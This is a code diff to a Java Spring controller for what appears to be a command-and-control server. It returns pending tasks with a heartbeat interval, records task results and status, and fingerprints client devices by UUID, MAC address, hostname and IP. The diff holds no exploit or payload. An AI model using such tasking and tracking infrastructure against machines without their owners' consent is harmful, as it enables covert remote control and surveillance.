@@ -39,7 +39,7 @@ public class C2Controller {
     }
 
     @PostMapping("/c2/tasks/pending")
-    public List<C2Task> getPendingTasks(@RequestBody(required = false) Map<String, Object> payload, HttpServletRequest request) {
+    public Map<String, Object> getPendingTasks(@RequestBody(required = false) Map<String, Object> payload, HttpServletRequest request) {
         // Record heartbeat (legacy support or just ip)
         C2Device device = recordHeartbeat(payload, request);
         
@@ -51,22 +51,37 @@ public class C2Controller {
         } else {
              queryWrapper.isNull("deviceId");
         }
-        return c2TaskMapper.selectList(queryWrapper);
+        
+        List<C2Task> tasks = c2TaskMapper.selectList(queryWrapper);
+        
+        Map<String, Object> response = new java.util.HashMap<>();
+        response.put("tasks", tasks);
+        // Default 60000ms if null
+        response.put("heartbeatInterval", device != null && device.getHeartbeatInterval() != null ? device.getHeartbeatInterval() : 60000);
+        
+        return response;
     }
 
     @PostMapping("/c2/tasks/result")
     public BaseResponse<Boolean> submitTaskResult(@RequestBody Map<String, Object> payload, HttpServletRequest request) {
-        recordHeartbeat(null, request);
+        recordHeartbeat(payload, request); // Pass payload to update heartbeat info
         String taskId = (String) payload.get("taskId");
         String result = (String) payload.get("result");
+        String status = (String) payload.get("status"); // Support status update
 
         if (taskId != null) {
             QueryWrapper<C2Task> queryWrapper = new QueryWrapper<>();
             queryWrapper.eq("taskId", taskId);
             C2Task task = c2TaskMapper.selectOne(queryWrapper);
             if (task != null) {
-                task.setResult(result);
-                task.setStatus("completed");
+                if (result != null) {
+                    task.setResult(result);
+                }
+                if (status != null) {
+                    task.setStatus(status);
+                } else {
+                    task.setStatus("completed"); // Default to completed if not specified
+                }
                 c2TaskMapper.updateById(task);
             }
         }
@@ -77,9 +92,17 @@ public class C2Controller {
     private C2Device recordHeartbeat(Map<String, Object> payload, HttpServletRequest request) {
         // External IP from request header/remote addr
         String externalIp = NetUtils.getIpAddress(request);
+        if ("0:0:0:0:0:0:0:1".equals(externalIp)) {
+            externalIp = "127.0.0.1";
+        }
         String internalIp = "Unknown";
         String hostName = "Unknown";
         String os = "Unknown";
+        String macAddress = null;
+        String uuid = null;
+        
+        // Debug logging
+        log.info("Received heartbeat payload: {}", payload);
         
         if (payload != null) {
             if (payload.containsKey("hostName")) {
@@ -87,6 +110,12 @@ public class C2Controller {
             }
             if (payload.containsKey("os")) {
                 os = (String) payload.get("os");
+            }
+            if (payload.containsKey("macAddress")) {
+                macAddress = (String) payload.get("macAddress");
+            }
+            if (payload.containsKey("uuid")) {
+                uuid = (String) payload.get("uuid");
             }
             // Client reported IP is treated as Internal IP
              if (payload.containsKey("ip")) {
@@ -97,14 +126,14 @@ public class C2Controller {
              }
         }
 
-        // Identify by External IP + Hostname to distinguish devices behind NAT if possible, 
-        // or just rely on Internal IP if available? 
-        // For simplicity, let's query by Hostname if available, else External IP.
-        // Better: Use a combination or generated UUID in client in future.
-        // Current logic: Query by hostName if present and not Unknown, else External IP.
-        
+        // Identify by UUID (Most reliable, persistent)
+        // Then MAC Address, then Hostname/External IP
         QueryWrapper<C2Device> queryWrapper = new QueryWrapper<>();
-        if (!"Unknown".equals(hostName)) {
+        if (uuid != null && !uuid.isEmpty()) {
+            queryWrapper.eq("uuid", uuid);
+        } else if (macAddress != null && !macAddress.isEmpty()) {
+            queryWrapper.eq("macAddress", macAddress);
+        } else if (!"Unknown".equals(hostName)) {
             queryWrapper.eq("hostName", hostName);
         } else {
             queryWrapper.eq("externalIp", externalIp);
@@ -119,16 +148,24 @@ public class C2Controller {
 
         if (device == null) {
             device = new C2Device();
+            device.setUuid(uuid); // Save UUID if provided
             device.setExternalIp(externalIp);
             device.setInternalIp(internalIp);
             device.setHostName(hostName);
             device.setOs(os);
+            device.setMacAddress(macAddress);
             device.setLastSeen(new Date());
             c2DeviceMapper.insert(device);
         } else {
             device.setLastSeen(new Date());
             // Update info
+            if (uuid != null) {
+                device.setUuid(uuid); // Update UUID if it was missing/changed (unlikely for same device, but good for migration)
+            }
             device.setExternalIp(externalIp);
+            if (macAddress != null) {
+                device.setMacAddress(macAddress);
+            }
             if (!"Unknown".equals(internalIp)) {
                 device.setInternalIp(internalIp);
             }
